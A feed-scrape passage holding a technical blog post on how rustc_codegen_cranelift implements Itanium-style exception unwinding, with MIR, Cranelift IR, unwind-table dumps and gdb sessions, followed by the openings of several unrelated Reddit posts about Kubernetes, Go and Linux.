systems.</li></ul><p>SEH and Itanium unwinding have a similar architecture: there is a table that indicates, for each instruction from which an exception may be thrown, which registers need to be restored to unwind the stack to the caller as well as contains a reference to a function (the so called personality function) which interprets a language-specific data format and a reference to some data in this format (called LSDA or language-specific data area for Itanium unwinding).</p><p>In most cases there is a single personality function for each language. Rust generally<a href=\"https://tweedegolf.nl/en/blog/157/exception-handling-in-rustc-codegen-cranelift#1\"></a> uses  as personality function.  For the LSDA, Rust uses the exact same format as GCC and Clang use for C++ despite not needing half its features because LLVM doesn't allow frontends to specify a custom format.</p><p>Both SEH and Itanium unwinding implement two-phase unwinding. In other words, they first do a scan over the stack to see if any function catches the exception (phase one) before actually unwinding (phase two). For this in the first phase SEH and Itanium unwinders call the personality function to check if there is a catch for the exception around the given call site. To do this, the personality function parses the LSDA looking up the entry for the current instruction pointer.</p><p>In the second phase the personality function is called again and this time it is given the chance to divert execution to an exception handler. In the case of SEH this exception handler is a so-called \"funclet\": a function which gets the stack pointer of the stack frame currently being unwound as argument, and unwinding resumes when this funclet returns.</p><p>For Itanium unwinding on the other hand, execution gets diverted to a \"landingpad\" which runs in the context of the stack frame being unwound. Unwinding either resumes when the landingpad calls  or in the case of a catch, the landingpad just continues execution as usual.</p><p>With the SEH method, all stack frames remain on the stack until unwinding has finished. It is also possible to unwind without removing any stack frames. Itanium unwinding instead removes each stack frame from the stack after it has been unwound, so effectively throwing an exception is an alternative return of the function. Cranelift currently only supports unwinding mechanisms that use landingpads, which is why cg_clif doesn't support unwinding on Windows.</p><p>While dwarfdump can be used to show part of the unwind info in a human-readable way, I'm not aware of any tool that is capable of showing the entire unwind info in a human-readable way: dwarfdump does not parse the LSDA, and there is no option to interleave assembly instructions and unwind instructions. As such I wrote my own tool for this, which I will use to show how exactly the unwinder sees our functions:</p><pre><code>$ git clone https://github.com/bjorn3/rust_unwind_inspect.git\n$ cd rust_unwind_inspect\n$ cargo build\n$ cp target/debug/rust_unwind_inspect ../\n</code></pre><h2>Unwinding without exception handlers</h2><p>Now on to showing how Itanium unwinding support is actually implemented in cg_clif. I'm going to skip ahead to the second phase of the unwinding process -- the actual unwinding -- for the sake of simplicity.</p><p>Let's start with the  function:</p><pre><code>//- panic_example.mir\n\n// [snip]\nfn do_panic() -&gt; () {\n    let mut _0: ();\n    let _1: !;\n\n    bb0: {\n        _1 = panic_any::&lt;()&gt;(const ()) -&gt; unwind continue;\n    }\n}\n// [snip]\n</code></pre><p>This is a simple function which consists of nothing other than a  call which never returns, and when it unwinds, it continues to the caller.</p><pre><code>;- panic_example.clif/do_panic.unopt.clif\nfunction u0:28() system_v {\n    gv0 = symbol colocated userextname0\n    sig0 = (i64) system_v\n    fn0 = colocated u0:6 sig0 ; Instance { def: Item(DefId(1:5518 ~ std[a023]::panic::panic_any)), args: [()] }\nblock0:\n    jump block1\nblock1:\n; _1 = std::panic::panic_any::&lt;()&gt;(const ())\n    v0 = global_value.i64 gv0\n    call fn0(v0)\n    trap user1\n}\n</code></pre><p>Nothing too exciting here.  gets lowered to a regular call of . The argument is an implicit argument of type  because  is marked with . When unwinding out of a  clif ir instruction, this will continue unwinding out of the current function.  shows the following:</p><pre><code>$ ./rust_unwind_inspect panic_example do_panic\n000000000003878c &lt;do_panic&gt;:\n  personality: 0x38db0 &lt;rust_eh_personality+0x0&gt;\n  LSDA: 0x1fd900 &lt;.gcc_except_table+0x1e4&gt;\n  0x3878c: stp x29, x30, [sp, #-0x10]!\n    CFA=SP+0x10 X29=Offset(-16) X30=Offset(-8)\n  0x38790: mov x29, sp\n  0x38794: adrp x0, #0x235000\n  0x38798: ldr x0, [x0, #0x578]\n  0x3879c: bl #0x37b40\n    call site 0x3879f..0x387a0 action=continue\n</code></pre><p>Here personality and LSDA are as explained in the <a href=\"https://tweedegolf.nl/en/blog/157/exception-handling-in-rustc-codegen-cranelift#Unwinding-ABI-crash-course\">previous section</a>. The <code>CFA=SP+0x10 X29=Offset(-16) X30=Offset(-8)</code> line tells us that</p><ul><li> can be found at offset -16 from </li><li> can be found at offset -8 from </li></ul><p>This information is all coming from the language independent half of the unwind tables which is found in . This is what the unwinder itself parses. In addition there is a line <code>call site 0x317a3..0x317a4 action=continue</code> which indicates that the previous instruction is a call which, if it throws an exception, should cause unwinding to continue to the caller of . This information comes from the LSDA found in  at offset 0x1e0. If no call site is found for a call that threw an exception, the personality function will indicate to the unwinder that unwinding should abort.</p><p>Now to see it in action in the debugger:</p><p>First we define a macro that allows us to set a breakpoint for the personality function getting executed for a given call site:</p><pre><code>(gdb) define break_on_personality_for\nset language c\nb rust_eh_personality if ((struct _Unwind_Context *)$x4).ra == $arg0\nset language auto\nend\n</code></pre><p>And now we can set a breakpoint for  and continue:</p><pre><code>(gdb) break_on_personality_for panic_example::do_panic+20\nBreakpoint 4 at 0xaaaaaaad8dbc: file library/std/src/sys/personality/gcc.rs, line 307.\n(gdb) continue\nContinuing.\nBreakpoint 4, std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n307                            rust_eh_personality_impl(\n(gdb) up\n#1  0x0000fffff7f972d8 in _Unwind_RaiseException_Phase2 (exc=exc@entry=0xaaaaaace1ce0, context=context@entry=0xffffffffe9f0, frames_p=frames_p@entry=0xffffffffe628)\n    at ../../../src/libgcc/unwind.inc:64\nwarning: 64     ../../../src/libgcc/unwind.inc: No such file or directory\n(gdb) print context.ra\n$4 = (void *) 0xaaaaaaad87a0 &lt;panic_example::do_panic+20&gt;\n(gdb) down\n#0  std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n307                            rust_eh_personality_impl(\n</code></pre><p>And to show the return value:</p><pre><code>(gdb) finish\nRun till exit from #0  std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n_Unwind_RaiseException_Phase2 (exc=exc@entry=0xaaaaaace1ce0, context=context@entry=0xffffffffe9f0, frames_p=frames_p@entry=0xffffffffe628) at ../../../src/libgcc/unwind.inc:66\nwarning: 66     ../../../src/libgcc/unwind.inc: No such file or directory\nValue returned is $5 = \"\\b\\000\\000\"\n(gdb) print (_Unwind_Reason_Code)$x0\n$6 = _URC_CONTINUE_UNWIND\n</code></pre><p>We had to explicitly read the return value from register x0 because cg_clif currently doesn't emit debuginfo for arguments and return types. We also had to use <code>((struct _Unwind_Context *)$x4).ra == $arg0</code> as condition for the breakpoint for this reason.</p><h2>Unwinding with an exception handler</h2><p>More exciting is the case where there is an exception handler in scope like our  function.</p><pre><code>//- panic_example.mir\n\n// [snip]\nfn some_func() -&gt; () {\n    let mut _0: ();\n    let _1: Droppable;\n    let _2: ();\n    scope 1 {\n        debug _a =&gt; const Droppable;\n    }\n\n    bb0: {\n        _2 = do_panic() -&gt; [return: bb1, unwind: bb3];\n    }\n\n    bb1: {\n        drop(_1) -&gt; [return: bb2, unwind continue];\n    }\n\n    bb2: {\n        return;\n    }\n\n    bb3 (cleanup): {\n        drop(_1) -&gt; [return: bb4, unwind terminate(cleanup)];\n    }\n\n    bb4 (cleanup): {\n        resume;\n    }\n}\n// [snip]\n</code></pre><p>This function first calls  and then, no matter if it unwinds or not, it runs the drop glue for the  value in . If the drop glue unwinds when called within the unwind path, the function will abort, otherwise it will unwind. And finally if the drop glue succeeds within the unwind path, unwinding will resume thanks to the  terminator.</p><pre><code>; panic_example.clif/some_func.unopt.clif\nfunction u0:29() system_v {\n    sig0 = () system_v\n    sig1 = (i64) system_v\n    sig2 = (i64) system_v\n    sig3 = () system_v\n    sig4 = (i64) system_v\n    fn0 = colocated u0:28 sig0 ; Instance { def: Item(DefId(0:7 ~ panic_example[4533]::do_panic)), args: [] }\n    fn1 = colocated u0:14 sig1 ; Instance { def: DropGlue(DefId(2:3040 ~ core[390d]::ptr::drop_in_place), Some(Droppable)), args: [Droppable] }\n    fn2 = colocated u0:14 sig2 ; Instance { def: DropGlue(DefId(2:3040 ~ core[390d]::ptr::drop_in_place), Some(Droppable)), args: [Droppable] }\n    fn3 = u0:47 sig3 ; \"_ZN4core9panicking16panic_in_cleanup17hda9d23801310caf7E\"\n    fn4 = u0:36 sig4 ; \"_Unwind_Resume\"\nblock0:\n    jump block1\nblock1:\n; _2 = do_panic()\n    try_call fn0(), sig0, block6, [ tag0: block7(exn0) ]\nblock7(v0: i64) cold:\n    v4 -&gt; v0\n    jump block4\nblock6:\n    jump block2\nblock2:\n; drop(_1)\n    v1 = iconst.i64 1\n    call fn1(v1)  ; v1 = 1\n    jump block3\nblock3:\n    return\nblock4 cold:\n; drop(_1)\n    v2 = iconst.i64 1\n    try_call fn2(v2), sig2, block5, [ tag0: block9(exn0) ]  ; v2 = 1\nblock9(v3: i64) cold:\n; panic _ZN4core9panicking16panic_in_cleanup17hda9d23801310caf7E\n    call fn3()\n    trap user1\nblock5 cold:\n; lib_call _Unwind_Resume\n    call fn4(v4)\n    trap user1\n}\n</code></pre><p>This is the clif ir produced for . The  call gets lowered to a  rather than a regular  because this time we want to divert execution to another code path in case of unwinding. In the <code>try_call fn0(), sig0, block6, [ tag0: block7(exn0) ]</code>,  is where execution continues if the call returns normally, while  is where execution will continue when unwinding. The  part indicates that  will get the first register set by the personality function as a block argument. In the case of Rust, this will be a pointer to the exception itself. Other languages may use additional \"landingpad arguments\". The  part is some opaque metadata that Cranelift will forward to cg_clif together with the position of all call sites and landingpads. cg_clif uses  to indicate a cleanup block and  to indicate that an exception should be caught. Once all cleanup code has run, a call to  will be made with the exception pointer as argument to resume unwinding.  will pop the stack frame of the caller and then continue unwinding as usual.</p><pre><code>$ ./unwind_inspect/target/debug/rust_unwind_inspect ./panic_example some_func\n00000000000387a4 &lt;some_func&gt;:\n  personality: 0x38db0 &lt;rust_eh_personality+0x0&gt;\n  LSDA: 0x1fd910 &lt;.gcc_except_table+0x1f4&gt;\n  0x387a4: stp x29, x30, [sp, #-0x10]!\n    CFA=SP+0x10 X29=Offset(-16) X30=Offset(-8)\n  0x387a8: mov x29, sp\n  0x387ac: str x20, [sp, #-0x10]!\n    CFA=X29+0x10 X29=Offset(-16) X30=Offset(-8) X20=Offset(-32)\n  0x387b0: bl #0x3878c\n    call site 0x387b3..0x387b4 landingpad=0x387c8 action=continue\n  0x387b4: mov x0, #1\n  0x387b8: bl #0x37dc0\n    call site 0x387bb..0x387bc action=continue\n  0x387bc: ldr x20, [sp], #0x10\n  0x387c0: ldp x29, x30, [sp], #0x10\n  0x387c4: ret\n  0x387c8: mov x20, x0\n  0x387cc: mov x0, #1\n  0x387d0: bl #0x37dc0\n    call site 0x387d3..0x387d4 landingpad=0x387e8 action=continue\n  0x387d4: adrp x1, #0x23f000\n  0x387d8: ldr x1, [x1, #0xdc8]\n  0x387dc: mov x0, x20\n  0x387e0: blr x1\n    call site 0x387e3..0x387e4 action=continue\n</code></pre><p>Our  call has <code>call site 0x387b3..0x387b4 landingpad=0x387c8 action=continue</code> as unwind info. This indicates that if the call unwinds, execution should jump to address . The Rust personality function will also set  (aka  in clif ir) to the exception pointer.</p><pre><code>(gdb) break_on_personality_for panic_example::some_func+16\nBreakpoint 5 at 0xaaaaaaad8dbc: file library/std/src/sys/personality/gcc.rs, line 307.\n(gdb) continue\nBreakpoint 5, std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n307                             rust_eh_personality_impl(\n(gdb) up\n#1  0x0000fffff7f972d8 in _Unwind_RaiseException_Phase2 (exc=exc@entry=0xaaaaaace1ce0, context=context@entry=0xffffffffe9f0, frames_p=frames_p@entry=0xffffffffe628)\n    at ../../../src/libgcc/unwind.inc:64\nwarning: 64     ../../../src/libgcc/unwind.inc: No such file or directory\n(gdb) print context.ra\n$7 = (void *) 0xaaaaaaad87b4 &lt;panic_example::some_func+16&gt;\ndown\n#0  std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n307                             rust_eh_personality_impl(\n</code></pre><p>We got to the personality function call for . Now let's set a couple of breakpoints to see how the personality function causes execution to jump to the landingpad:</p><pre><code>(gdb) break _Unwind_SetGR\nBreakpoint 6 at 0xfffff7f9494c: file ../../../src/libgcc/unwind-dw2.c, line 275.\n(gdb) break _Unwind_SetIP\nBreakpoint 7 at 0xfffff7f949e0: file ../../../src/libgcc/unwind-dw2.c, line 369.\n</code></pre><p> and  are functions called by the personality function to tell the unwinder how to run the landingpad.</p><pre><code>(gdb) continue\nBreakpoint 6, _Unwind_SetGR (context=0xffffffffe9f0, index=0, val=187649986796768) at ../../../src/libgcc/unwind-dw2.c:275\nwarning: 275    ../../../src/libgcc/unwind-dw2.c: No such file or directory\n(gdb) print *(struct _Unwind_Exception *)val\n$8 = {exception_class = 6076294132934528845, exception_cleanup = 0xaaaaaabde440 &lt;panic_unwind::imp::panic::exception_cleanup&gt;, private_1 = 0, private_2 = 281474976706176}\n(gdb) continue\nBreakpoint 6, _Unwind_SetGR (context=0xffffffffe9f0, index=1, val=0) at ../../../src/libgcc/unwind-dw2.c:275\n275     in ../../../src/libgcc/unwind-dw2.c\n</code></pre><p>The first thing the personality function does is use  to set the aformentioned \"landingpad arguments\". x0 is set to the exception pointer, while x1 is set to zero. The latter isn't needed for cg_clif, but cg_llvm generates landingpads that take an additional i32 argument even though it doesn't do anything with it. I believe C++ uses it for the exception type. I suspect at some point LLVM didn't handle landingpads which are missing this extra argument.</p><pre><code>(gdb) continue\nBreakpoint 7, _Unwind_SetIP (context=0xffffffffe9f0, val=187649984661448) at ../../../src/libgcc/unwind-dw2.c:369\n369     in ../../../src/libgcc/unwind-dw2.c\n(gdb) set $landingpad=val\n</code></pre><p>Next up  is used to set the address of the landingpad. We save this address here to set a breakpoint on it later on.</p><pre><code>(gdb) up 2\n#2  0x0000aaaaaaad8dc0 in std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n307                             rust_eh_personality_impl(\n(gdb) finish\n_Unwind_RaiseException_Phase2 (exc=exc@entry=0xaaaaaace1ce0, context=context@entry=0xffffffffe9f0, frames_p=frames_p@entry=0xffffffffe628) at ../../../src/libgcc/unwind.inc:66\nwarning: 66     ../../../src/libgcc/unwind.inc: No such file or directory\nValue returned is $9 = \"\\a\\000\\000\"\n(gdb) p (_Unwind_Reason_Code)$x0\n$10 = _URC_INSTALL_CONTEXT\n</code></pre><p>The personality function returns  to indicate that there is a landingpad.</p><pre><code>(gdb) break *$landingpad\nBreakpoint 8 at 0xaaaaaaad87c8: file panic_example.rs, line 21.\n(gdb) continue\nBreakpoint 8, 0x0000aaaaaaad87c8 in panic_example::some_func () at panic_example.rs:21\n21      }\n(gdb) disassemble\nDump of assembler code for function panic_example::some_func:\n   0x0000aaaaaaad87a4 &lt;+0&gt;:     stp     x29, x30, [sp, #-16]!\n   0x0000aaaaaaad87a8 &lt;+4&gt;:     mov     x29, sp\n   0x0000aaaaaaad87ac &lt;+8&gt;:     str     x20, [sp, #-16]!\n   0x0000aaaaaaad87b0 &lt;+12&gt;:    bl      0xaaaaaaad878c &lt;panic_example::do_panic&gt;\n   0x0000aaaaaaad87b4 &lt;+16&gt;:    mov     x0, #0x1                        // #1\n   0x0000aaaaaaad87b8 &lt;+20&gt;:    bl      0xaaaaaaad7dc0 &lt;_ZN4core3ptr45drop_in_place$LT$panic_example..Droppable$GT$17hb62d62884fcb8d11E&gt;\n   0x0000aaaaaaad87bc &lt;+24&gt;:    ldr     x20, [sp], #16\n   0x0000aaaaaaad87c0 &lt;+28&gt;:    ldp     x29, x30, [sp], #16\n   0x0000aaaaaaad87c4 &lt;+32&gt;:    ret\n=&gt; 0x0000aaaaaaad87c8 &lt;+36&gt;:    mov     x20, x0\n   0x0000aaaaaaad87cc &lt;+40&gt;:    mov     x0, #0x1                        // #1\n   0x0000aaaaaaad87d0 &lt;+44&gt;:    bl      0xaaaaaaad7dc0 &lt;_ZN4core3ptr45drop_in_place$LT$panic_example..Droppable$GT$17hb62d62884fcb8d11E&gt;\n   0x0000aaaaaaad87d4 &lt;+48&gt;:    adrp    x1, 0xaaaaaacdf000\n   0x0000aaaaaaad87d8 &lt;+52&gt;:    ldr     x1, [x1, #3528]\n   0x0000aaaaaaad87dc &lt;+56&gt;:    mov     x0, x20\n   0x0000aaaaaaad87e0 &lt;+60&gt;:    blr     x1\n   0x0000aaaaaaad87e4 &lt;+64&gt;:    udf     #49439\n   0x0000aaaaaaad87e8 &lt;+68&gt;:    adrp    x3, 0xaaaaaacdf000\n   0x0000aaaaaaad87ec &lt;+72&gt;:    ldr     x3, [x3, #2688]\n   0x0000aaaaaaad87f0 &lt;+76&gt;:    blr     x3\n   0x0000aaaaaaad87f4 &lt;+80&gt;:    udf     #49439\nEnd of assembler dump.\n</code></pre><p>And finally if we set a breakpoint on the registered landingpad value and continue execution, we indeed see that execution jumped to the landingpad.</p><p>And finally to finish it up, let's catch a panic using :</p><pre><code>fn do_catch_panic() -&gt; () {\n    let mut _0: ();\n    let mut _1: i32;\n    let mut _2: fn(*mut u8);\n    let mut _3: *mut u8;\n    let mut _4: fn(*mut u8, *mut u8);\n    let _5: !;\n\n    bb0: {\n        _2 = do_catch_panic::do_call as fn(*mut u8) (PointerCoercion(ReifyFnPointer, Implicit));\n        _3 = const 0_usize as *mut u8 (PointerWithExposedProvenance);\n        _4 = do_catch_panic::do_catch as fn(*mut u8, *mut u8) (PointerCoercion(ReifyFnPointer, Implicit));\n        _1 = std::intrinsics::catch_unwind(move _2, copy _3, move _4) -&gt; [return: bb1, unwind unreachable];\n    }\n\n    bb1: {\n        switchInt(move _1) -&gt; [0: bb2, otherwise: bb3];\n    }\n\n    bb2: {\n        _5 = std::process::abort() -&gt; unwind continue;\n    }\n\n    bb3: {\n        return;\n    }\n}\n</code></pre><p> calls the first function pointer with the second argument as argument. If this function unwinds, it will call the second function pointer with the same argument and additionally the exception pointer. And finally it returns 1 if an exception was caught and 0 otherwise.</p><pre><code>function u0:30() system_v {\n    sig0 = (i64) system_v\n    sig1 = (i64, i64) system_v\n    sig2 = (i64) system_v\n    sig3 = (i64, i64) system_v\n    sig4 = () system_v\n    fn0 = colocated u0:31 sig0 ; Instance { def: Item(DefId(0:10 ~ panic_example[4533]::do_catch_panic::do_call)), args: [] }\n    fn1 = colocated u0:32 sig1 ; Instance { def: Item(DefId(0:11 ~ panic_example[4533]::do_catch_panic::do_catch)), args: [] }\n    fn2 = u0:44 sig4 ; Instance { def: Item(DefId(1:6188 ~ std[a023]::process::abort)), args: [] }\nblock0:\n    jump block1\nblock1:\n; _2 = do_catch_panic::do_call as fn(*mut u8) (PointerCoercion(ReifyFnPointer, Implicit))\n    v0 = func_addr.i64 fn0\n; _3 = const 0_usize as *mut u8 (PointerWithExposedProvenance)\n    v1 = iconst.i64 0\n; _4 = do_catch_panic::do_catch as fn(*mut u8, *mut u8) (PointerCoercion(ReifyFnPointer, Implicit))\n    v2 = func_addr.i64 fn1\n; _1 = std::intrinsics::catch_unwind(move _2, copy _3, move _4)\n    try_call_indirect v0(v1), sig2, block5, [ tag1: block6(exn0) ]  ; v1 = 0\nblock5:\n    v3 = iconst.i32 0\n    jump block2(v3)  ; v3 = 0\nblock6(v4: i64) cold:\n    call_indirect.i64 sig3, v2(v1, v4)  ; v1 = 0\n    v5 = iconst.i32 1\n    jump block2(v5)  ; v5 = 1\nblock2(v6: i32):\n; switchInt(move _1)\n    brif v6, block4, block3\nblock3 cold:\n; _5 = std::process::abort()\n    call fn2()\n    trap user1\nblock4:\n    return\n}\n</code></pre><p>In Cranelift IR this is implemented using a  with  rather than  for the cleanup block. And additionally it won't call  in the end, but rather continue execution after the intrinsic call. In the unwind tables the exception catching is represented using:</p><pre><code>$ cargo run -- ../panic_example do_catch_panic\n    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.04s\n     Running `target/debug/rust_unwind_inspect ../panic_example do_catch_panic`\n00000000000387f8 &lt;do_catch_panic&gt;:\n  personality: 0x38db0 &lt;rust_eh_personality+0x0&gt;\n  LSDA: 0x1fd930 &lt;.gcc_except_table+0x214&gt;\n  LSDA actions:\n    0x0: catch 0x0 next=None\n  0x387f8: stp x29, x30, [sp, #-0x10]!\n    CFA=SP+0x10 X29=Offset(-16) X30=Offset(-8)\n  0x387fc: mov x29, sp\n  0x38800: stp x20, x22, [sp, #-0x10]!\n    CFA=X29+0x10 X29=Offset(-16) X30=Offset(-8) X20=Offset(-32) X22=Offset(-24)\n  0x38804: adrp x11, #0x235000\n  0x38808: ldr x11, [x11, #0x4b8]\n  0x3880c: mov x0, #0\n  0x38810: mov x22, x0\n  0x38814: adrp x20, #0x235000\n  0x38818: ldr x20, [x20, #0x4c0]\n  0x3881c: blr x11\n    call site 0x3881f..0x38820 landingpad=0x38838 action=0\n  0x38820: mov w8, #0\n  0x38824: mov w15, w8\n  0x38828: cbz x15, #0x3884c\n  0x3882c: ldp x20, x22, [sp], #0x10\n  0x38830: ldp x29, x30, [sp], #0x10\n  0x38834: ret\n  0x38838: mov x1, x0\n  0x3883c: mov x0, x22\n  0x38840: blr x20\n    call site 0x38843..0x38844 action=continue\n  0x38844: mov w8, #1\n  0x38848: b #0x38824\n  0x3884c: adrp x0, #0x23e000\n  0x38850: ldr x0, [x0, #0xab0]\n  0x38854: blr x0\n    call site 0x38857..0x38858 action=continue\n</code></pre><p>where  references the  LSDA action. In C++ the  would instead be the typeid of the caught exception and  optionally representing another  block for the same  block.</p><p>And finally one last debugger step through for completeness. It is not much different from the  step through, so I won't discuss it in detail.</p><pre><code>(gdb) break_on_personality_for panic_example::do_catch_panic+40\nBreakpoint 9 at 0xaaaaaaad8dbc: file library/std/src/sys/personality/gcc.rs, line 307.\n(gdb) continue\nBreakpoint 9, std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n307                             rust_eh_personality_impl(\n(gdb) up\n#1  0x0000fffff7f97354 in _Unwind_RaiseException_Phase2 (exc=exc@entry=0xaaaaaace1ce0, context=context@entry=0xffffffffea90, frames_p=frames_p@entry=0xffffffffe6c8)\n    at ../../../src/libgcc/unwind.inc:64\nwarning: 64     ../../../src/libgcc/unwind.inc: No such file or directory\n(gdb) print context.ra\n$11 = (void *) 0xaaaaaaad8820 &lt;panic_example::do_catch_panic+40&gt;\n(gdb) down\n#0  std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n307                             rust_eh_personality_impl(\n(gdb) continue\nBreakpoint 6, _Unwind_SetGR (context=0xffffffffea90, index=0, val=187649986796768) at ../../../src/libgcc/unwind-dw2.c:275\nwarning: 275    ../../../src/libgcc/unwind-dw2.c: No such file or directory\n(gdb) print *(struct _Unwind_Exception *)val\n$12 = {exception_class = 6076294132934528845, exception_cleanup = 0xaaaaaabde440 &lt;panic_unwind::imp::panic::exception_cleanup&gt;, private_1 = 0, private_2 = 281474976706176}\n(gdb) continue\nBreakpoint 6, _Unwind_SetGR (context=0xffffffffea90, index=1, val=0) at ../../../src/libgcc/unwind-dw2.c:275\n275     in ../../../src/libgcc/unwind-dw2.c\n(gdb) continue\nBreakpoint 7, _Unwind_SetIP (context=0xffffffffea90, val=187649984661560) at ../../../src/libgcc/unwind-dw2.c:369\n369     in ../../../src/libgcc/unwind-dw2.c\n(gdb) set $landingpad=val\n(gdb) up 2\n#2  0x0000aaaaaaad8dc0 in std::sys::personality::gcc::rust_eh_personality () at library/std/src/sys/personality/gcc.rs:307\n307                             rust_eh_personality_impl(\n(gdb) finish\n_Unwind_RaiseException_Phase2 (exc=exc@entry=0xaaaaaace1ce0, context=context@entry=0xffffffffea90, frames_p=frames_p@entry=0xffffffffe6c8) at ../../../src/libgcc/unwind.inc:66\nwarning: 66     ../../../src/libgcc/unwind.inc: No such file or directory\nValue returned is $13 = \"\\a\\000\\000\"\n(gdb) print (_Unwind_Reason_Code)$x0\n$14 = _URC_INSTALL_CONTEXT\n(gdb) break *$landingpad\nBreakpoint 10 at 0xaaaaaaad8838: file panic_example.rs, line 43.\n(gdb) continue\nBreakpoint 10, 0x0000aaaaaaad8838 in panic_example::do_catch_panic () at panic_example.rs:43\n43      }\n(gdb) disassemble\nDump of assembler code for function panic_example::do_catch_panic:\n   0x0000aaaaaaad87f8 &lt;+0&gt;:     stp     x29, x30, [sp, #-16]!\n   0x0000aaaaaaad87fc &lt;+4&gt;:     mov     x29, sp\n   0x0000aaaaaaad8800 &lt;+8&gt;:     stp     x20, x22, [sp, #-16]!\n   0x0000aaaaaaad8804 &lt;+12&gt;:    adrp    x11, 0xaaaaaacd5000\n   0x0000aaaaaaad8808 &lt;+16&gt;:    ldr     x11, [x11, #1208]\n   0x0000aaaaaaad880c &lt;+20&gt;:    mov     x0, #0x0                        // #0\n   0x0000aaaaaaad8810 &lt;+24&gt;:    mov     x22, x0\n   0x0000aaaaaaad8814 &lt;+28&gt;:    adrp    x20, 0xaaaaaacd5000\n   0x0000aaaaaaad8818 &lt;+32&gt;:    ldr     x20, [x20, #1216]\n   0x0000aaaaaaad881c &lt;+36&gt;:    blr     x11\n   0x0000aaaaaaad8820 &lt;+40&gt;:    mov     w8, #0x0                        // #0\n   0x0000aaaaaaad8824 &lt;+44&gt;:    mov     w15, w8\n   0x0000aaaaaaad8828 &lt;+48&gt;:    cbz     x15, 0xaaaaaaad884c &lt;panic_example::do_catch_panic+84&gt;\n   0x0000aaaaaaad882c &lt;+52&gt;:    ldp     x20, x22, [sp], #16\n   0x0000aaaaaaad8830 &lt;+56&gt;:    ldp     x29, x30, [sp], #16\n   0x0000aaaaaaad8834 &lt;+60&gt;:    ret\n=&gt; 0x0000aaaaaaad8838 &lt;+64&gt;:    mov     x1, x0\n   0x0000aaaaaaad883c &lt;+68&gt;:    mov     x0, x22\n   0x0000aaaaaaad8840 &lt;+72&gt;:    blr     x20\n   0x0000aaaaaaad8844 &lt;+76&gt;:    mov     w8, #0x1                        // #1\n   0x0000aaaaaaad8848 &lt;+80&gt;:    b       0xaaaaaaad8824 &lt;panic_example::do_catch_panic+44&gt;\n   0x0000aaaaaaad884c &lt;+84&gt;:    adrp    x0, 0xaaaaaacde000\n   0x0000aaaaaaad8850 &lt;+88&gt;:    ldr     x0, [x0, #2736]\n   0x0000aaaaaaad8854 &lt;+92&gt;:    blr     x0\n   0x0000aaaaaaad8858 &lt;+96&gt;:    udf     #49439\nEnd of assembler dump.\n</code></pre><p>We've now seen how exception handling works in cg_clif. Currently, this feature is still disabled by default because I'm still in the process of finishing the implementation and fixing a performance regression caused by enabling it. Follow the <a href=\"https://github.com/rust-lang/rustc_codegen_cranelift/issues/1567\">tracking issue</a> to stay up to date!</p><p>The following gdb script can be used to reproduce the debugger session:</p><pre><code>set debuginfod enabled on\nset pagination off\nb do_panic\nrun\nbt\nb _Unwind_RaiseException\nc\nbt\np exc\np *exc\np (char[8])(exc.exception_class)\nb _Unwind_RaiseException_Phase2\nc\ndel 3\ndefine break_on_personality_for\nset language c\nb rust_eh_personality if ((struct _Unwind_Context *)$x4).ra == $arg0\nset language auto\nend\necho \\ndo_panic\\n===========================\\n\nbreak_on_personality_for panic_example::do_panic+20\nc\nup\np context.ra\ndown\nfinish\np (_Unwind_Reason_Code)$x0\necho \\nsome_func\\n===========================\\n\nbreak_on_personality_for panic_example::some_func+16\nc\nup\np context.ra\ndown\nb _Unwind_SetGR\nb _Unwind_SetIP\nc\np *(struct _Unwind_Exception *)val\nc\nc\nset $landingpad=val\nup 2\nfinish\np (_Unwind_Reason_Code)$x0\nb *$landingpad\nc\ndisassemble\necho \\ndo_catch_panic\\n===========================\\n\nbreak_on_personality_for panic_example::do_catch_panic+40\nc\nup\np context.ra\ndown\nc\np *(struct _Unwind_Exception *)val\nc\nc\nset $landingpad=val\nup 2\nfinish\np (_Unwind_Reason_Code)$x0\nb *$landingpad\nc\ndisassemble\n</code></pre>","contentLength":31660,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lo3v9h/exception_handling_in_rustc_codegen_cranelift/"},{"title":"Ask r/kubernetes: What are you working on this week?","url":"https://www.reddit.com/r/kubernetes/comments/1lo3lj1/ask_rkubernetes_what_are_you_working_on_this_week/","date":1751277620,"author":"/u/gctaylor","guid":176472,"unread":true,"content":"<p>What are you up to with Kubernetes this week? Evaluating a new tool? In the process of adopting? Working on an open source project or contribution? Tell <a href=\"https://www.reddit.com/r/kubernetes\">/r/kubernetes</a> what you're up to this week!</p>","contentLength":195,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I just want to express my appreciation for golang","url":"https://www.reddit.com/r/golang/comments/1lo2b64/i_just_want_to_express_my_appreciation_for_golang/","date":1751272434,"author":"/u/sebastianstehle","guid":176427,"unread":true,"content":"<p>Hi, I am from the .NET world and I really hate that more and more features are added to the language. But I am working with it since a 15 years, so I know every single detail and the code is easy to understand for me.</p><p>But at the moment I am also in a kotlin project. And I don't know if kotlin has more or less features but I have the impression that in every code review I see something new. A weird language construct or function from the runtime library that should improve something by getting rid of a few characters. If you are familiar with a programming language you do not see the problems so clearly, but know I am aware how much kotlin (and probably C#) can suck.</p><p>When I work with go, I just understand it. There is only one way to do something and not 10. I struggle with generics a little bit, but overall it is a great experience.</p>","contentLength":842,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"My Linux journey so far","url":"https://www.reddit.com/r/linux/comments/1lo27j5/my_linux_journey_so_far/","date":1751272006,"author":"/u/onelostalien777","guid":176475,"unread":true,"content":"<p>I started with Manjaro like 10 years ago and used it for a few months and then switched back to windows, tried ubuntu and a few others and then forgot about linux for many years, at the start if the year i started checking distros out again, i started with mint for nearly a month and it was ok, then i went to arch and i liked it but i don't have that much time to configure a lot of things ( even tho its pretty fun and i do enjoy it but i don't have time to fix 